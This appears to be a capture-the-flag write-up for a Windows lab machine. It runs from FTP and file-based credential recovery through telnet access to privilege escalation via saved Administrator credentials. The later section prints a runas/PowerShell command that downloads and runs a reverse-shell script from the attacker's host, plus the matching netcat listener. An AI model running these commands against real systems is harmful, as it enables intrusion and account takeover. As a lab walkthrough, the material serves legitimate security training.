1,Recon
port scan 
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
Page check
![](images/Pasted%20image%2020241209075100.png)
It seems like nothing here.
So I would continue enumerating the valid web-contents
```
But seems like nothing of web-contents
```

By searching the `LON-MC6` from google, I found something interesting
```
MS09-042: Vulnerability in Telnet could allow remote code execution
```

ftp service
I have found we can login with anonymous user
```
Then we can get 2 files
backup.mdb Access Control.zip

PS:in this place, must use binary mode
For binary files like .mdb, this can lead to corrupted file contents. ASCII mode automatically converts line breaks (\n) to a platform-dependent format (such as \r\n on Windows), but this can corrupt the structure of binary files.

To ensure that the file transfer was correct, re-download the file using binary mode.

use status to check the mode
and if you want to change into binary, just in the ftp shell command binary
```

In this place, we can use `https://www.mdbopener.com/` to check the mdb file or use
`mdbtools` to check it.
![](images/Pasted%20image%2020241209081932.png)
Press the `auth user` and check the database
![](images/Pasted%20image%2020241209081647.png)

Then we can get the certification `admin” and “access4u@security” `

So let's continue to check the zip file and use the `access4u@security` as the password, we can successfully get the file `Access Control.pst`

I now have an Outlook email folder file:
```
 file Access\ Control.pst 
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Like the database, there are many ways to get to this data. I’ll convert it to mbox format using readpst (apt install readpst):
`readpst Access\ Control.pst`

Then we can read the mail clearly
```
Hi there,

 

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

 

Regards,

John

```

So I guess we can use `security:4Cc3ssC0ntr0ller` to the service telnet
![](images/Pasted%20image%2020241209082723.png)
Then we can get the shell of user security

On the host, I’ll need to find that there are stored credentials for the administrator. There are two things that could tip me off to that. First, I could check the Public folder, and find a link file on the desktop:
```
C:\Users\Public>cd desktop

C:\Users\Public\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is 9C45-DBF0

 Directory of C:\Users\Public\Desktop

08/22/2018  10:18 PM             1,870 ZKAccess3.5 Security System.lnk
               1 File(s)          1,870 bytes
               0 Dir(s)  16,682,262,528 bytes free

C:\Users\Public\Desktop>type "ZKAccess3.5 Security System.lnk"
LF@ 7#P/PO :+00/C:\R1M:Windows:M:*wWindowsV1MVSystem32:MV*System32X2P:
                                                                       runas.exe:1:1*Yrunas.exeL-KEC:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred "C:\ZKTeco\ZKAccess3.5\Access.exe"'C:\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%SystemDrive%\ZKTeco\ZKAccess3.5\img\AccessNET.ico%
wN]ND.Q`Xaccess_8{E3Oj)H)ΰ[_8{E3Oj)H)ΰ[  1SPSXFL8C&me*S-1-5-21-953262931-566350628-63446256-500
```

I’m particularly interested in:
`C:\Windows\System32\runas.exe#..\..\..\Windows\System32\runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred`

It’s a bit jumbled, but I see that it’s calling runas and using the /savedcred flag. That suggests to me that creds are cached for the Administrator account.

To check that assumption, or just as part of enumeration before finding the link file, I can run cmdkey /list:
```
C:\Users\Public\Desktop>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

```
runas 是 Windows 操作系统中的一个命令行工具，用于以其他用户的身份（通常是管理员）运行程序或命令。它类似于 Linux 系统中的 sudo 或 su 命令，允许您在不同权限上下文中执行操作。

runas [参数] /user:用户名称 "程序或命令"

runas /user:Administrator "cmd.exe"

```

First, I’ll clone a copy of Nishang from github if I don’t already have it.
If I open up the PowerShell script and look at the usage, I’ll see that I want to do a reverse shell, so something like this:
```
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
```
I’m going to have the Access box iex this script. As it is by default, that will just load all the functions in this script into the current PowerShell session. But I want to actually run one of those function. So I’ll add that line to the bottom of the script:
```
root@kali# tail Invoke-PowerShellTcp.ps1 
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.11 -Port 443
```

Now I’ll use my telnet shell to execute:
```
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.10/Invoke-PowerShellTcp.ps1')"
```

I see the callback in my nc window:
```
root@kali# nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.98] 49164
Windows PowerShell running as user Administrator on ACCESS
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
access\administrator
```

In other words, here, runas is mainly used to elevate permissions and execute remote reverse shell to get SYSTEM.